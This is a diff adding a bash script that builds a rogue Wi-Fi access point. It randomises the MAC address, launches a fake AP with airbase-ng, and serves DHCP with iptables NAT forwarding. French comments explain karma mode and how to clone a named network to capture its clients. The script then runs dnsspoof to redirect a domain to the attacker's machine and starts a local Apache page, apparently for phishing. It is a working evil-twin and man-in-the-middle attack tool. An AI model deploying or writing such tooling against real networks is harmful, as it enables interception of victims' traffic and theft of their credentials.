@@ -1,0 +1,250 @@
+#!/bin/bash
+
+#============================================================
+
+#===========================COLORS===========================
+
+VERT="\\033[1;32m"
+BLANC="\\033[0;39m"
+ROUGE="\\033[1;31m"
+
+error() {
+echo -e "$ROUGE""An error occurred."
+echo -e "Rogue AP script will stop""$BLANC"
+exit 1
+}
+
+taskDone() {
+echo -e "$VERT""Done""$BLANC"
+}
+
+#============================================================
+
+#==================ARGUMENT PARSING==========================
+
+nbArgTemp=$# #Initial number of arguments
+
+while [[ $# > 1 ]]
+do
+key="$1"
+
+case $key in
+    -i|--interface)
+    ROGUE_IFACE="$2"
+    shift 
+    ;;
+    -n|--net)
+    NET_IFACE="$2"
+    shift 
+    ;;
+    -e|--essid)
+    ESSID="$2"
+    shift 
+    ;;
+    --default)
+    DEFAULT=YES
+    ;;
+    *)
+  
+    ;;
+esac
+shift 
+done
+
+if test $nbArgTemp -lt 4
+then
+     echo "USAGE : setAP -i <ROGUE INTERFACE> -n <NET INTERFACE> -e <ESSID>"
+     echo "EXEMPLE : setAP wlan1 wlan0 Batman"
+     exit 1
+fi
+
+echo " __ __ _____     _____ _____ 
+|  |  |  _  |___|  _  |  _  |
+|_   _|     |  _|     |   __|
+  |_| |__|__|_| |__|__|__|   "
+
+echo ""
+echo ROGUE INTERFACE = "${ROGUE_IFACE}"
+echo NET INTERFACE = "${NET_IFACE}"
+
+if test $nbArgTemp -lt 6
+then
+     RANDOM_WORD="$(shuf -n1 RANDOM_ESSID.txt)"
+     echo -e "ESSID (random) : ""$VERT""$RANDOM_WORD""$BLANC"
+     ESSID=$RANDOM_WORD
+fi
+
+if test $nbArgTemp -eq 6
+then
+     echo -e ESSID = "$VERT""${ESSID}""$BLANC"
+fi
+
+#============================================================
+
+#=======================PARAMETERS===========================
+
+MON_IFACE=wlan0mon
+AP_IFACE=at0
+AP_ADDRESS=10.0.0.254
+
+#============================================================
+
+#==============INIT AND POWERING ROGUE_IFACE=================
+
+echo -en "Killing NetworkManager... "
+pkill NetworkManager
+taskDone
+echo -en "Killing DHCP... "
+pkill dhclient >/dev/null 2>&1
+taskDone
+echo -en "Killing DHCPD... "
+pkill dhcpd >/dev/null 2>&1
+taskDone
+echo -en "Killing wpa_supplicant... "
+pkill wpa_supplicant
+taskDone
+echo -en "Killing Airbase-ng... "
+pkill airbase-ng
+taskDone
+echo -en "Unblock rkfill... "
+rfkill unblock all >/dev/null 2>&1
+taskDone
+echo -en "Stop $MON_IFACE... "
+airmon-ng stop $MON_IFACE >/dev/null 2>&1
+taskDone
+
+ifconfig $ROGUE_IFACE down
+macchanger -r $ROGUE_IFACE  	      #randomise our MAC
+
+echo -en "Restart $ROGUE_IFACE interface... "
+ifconfig $ROGUE_IFACE up
+taskDone
+
+#echo -en "Change regulatory domain... "
+#iw reg set BO                        #change our regulatory domain to something more permissive
+#echo -en "Set power at 1W... "
+#iwconfig $ROGUE_IFACE txpower 30      #1Watt transmit power
+#taskDone
+
+#===============================================================
+
+#=============================DHCP==============================
+
+#Check if isc-dhcp-server is installed
+if dpkg -s isc-dhcp-server 2>/dev/null | grep "Status: install ok installed" >/dev/null 2>&1; then
+echo -e "isc-dhcp-server is already ""$VERT""installed""$BLANC"
+else
+echo "isc-dhcp-server install in progress"
+if apt-get -y install isc-dhcp-server 1>/dev/null; then
+echo -e "isc-dhcp-server installed: ""$VERT""yes""$BLANC"
+else
+error "the installation of isc-dhcp-server"
+fi
+fi
+
+#Configure isc-dhcp-server
+echo -en "Write /etc/default/isc-dhcp-server... "
+cat >/etc/default/isc-dhcp-server <<EOF
+INTERFACES="$AP_IFACE"
+EOF
+taskDone
+
+echo -en "Write /etc/dhcp/dhcpd.conf... "
+cat >/etc/dhcp/dhcpd.conf <<EOF
+
+default-lease-time 600;
+max-lease-time 7200;
+authoritative;
+subnet 10.0.0.0 netmask 255.255.255.0 {
+option subnet-mask 255.255.255.0;
+option broadcast-address 10.0.0.255;
+option routers $AP_ADDRESS;
+option domain-name-servers 8.8.8.8;
+range 10.0.0.2 10.0.0.253;
+}
+EOF
+taskDone
+
+#===============================================================
+
+#=========================AIREBASE==============================
+
+echo -e "Putting $ROGUE_IFACE In Monitor Mode... "
+airmon-ng start $ROGUE_IFACE
+echo -en "$MON_IFACE start... "
+taskDone
+echo -en "Starting Fake AP... "
+
+#          airbase-ng -c 6 -P -C 20 -y -v $MON_IFACE >/dev/null 2>&1 &
+                      
+#                      ---------> Comments (french)<---------- 
+#
+# -c 6 est pour le channel 6, il faut airodump pour voir les channels les moins occupés.
+# -P est pour le karma mode, il va répondre oui à toutes les requêtes.
+# -C 20 est pour balancer du beacons une fois l'authentification faite
+# -y empêche de dire oui à tout ceux qui cherchent une connection style : "il y a quelqu'un ?"
+# -v est le mode verbeux
+
+
+#               ---------> Alternative (plus ciblée) <---------- 
+#
+           airbase-ng -c 6 -e $ESSID -v $MON_IFACE >/dev/null 2>&1 &
+#
+# -e permet de donner un nom SSID à l'AP, de manière à cibler UN AP choisi à spoofer
+# c'est à dire : si qlq est connecté à neuf1Y5C, si je fait -e "neuf1Y5C" je vais rammasser ses clients.
+ 
+sleep 5;
+taskDone
+
+#===============================================================================
+
+#=============================START AP AND ROUTE================================
+
+echo -en "Starting $AP_IFACE... "
+ifconfig $AP_IFACE up
+ifconfig $AP_IFACE $AP_ADDRESS netmask 255.255.255.0 # Change IP addresses as configured in your dhcpd.conf
+taskDone
+
+echo -en "Configure route... "
+route add -net 10.0.0.0 netmask 255.255.255.0 gw $AP_ADDRESS # Change IP addresses as configured in your dhcpd.conf
+taskDone
+
+echo -en "Configure iptables... "
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+iptables -P FORWARD ACCEPT
+iptables -t nat -A POSTROUTING -o $NET_IFACE -j MASQUERADE
+taskDone
+
+echo -en "Reset DHCP lease... "
+echo > '/var/lib/dhcp/dhcpd.leases'
+taskDone
+
+echo -en "Start DHCP on $AP_IFACE... "
+dhcpd -d -f -cf /etc/dhcp/dhcpd.conf $AP_IFACE >/dev/null 2>&1 &
+sleep 5;
+taskDone
+
+echo -en "Activate Ip Forwarding... "
+echo "1" > /proc/sys/net/ipv4/ip_forward
+taskDone
+echo -e "Server "$VERT""$ESSID""$BLANC" is running. "
+
+#==================================================================
+
+#========================= DNS SPOOF ==============================
+
+echo -en "Enable dnsspoofing of example.com to "$AP_ADDRESS"... "
+echo "$AP_ADDRESS www.example.com" > dns.txt
+dnsspoof -i $AP_IFACE -f dns.txt >/dev/null 2>&1 &
+taskDone
+
+BIND_ADDRESS=$AP_ADDRESS
+
+./bindApache $BIND_ADDRESS $AP_IFACE
+taskDone
+
+exit 0
+
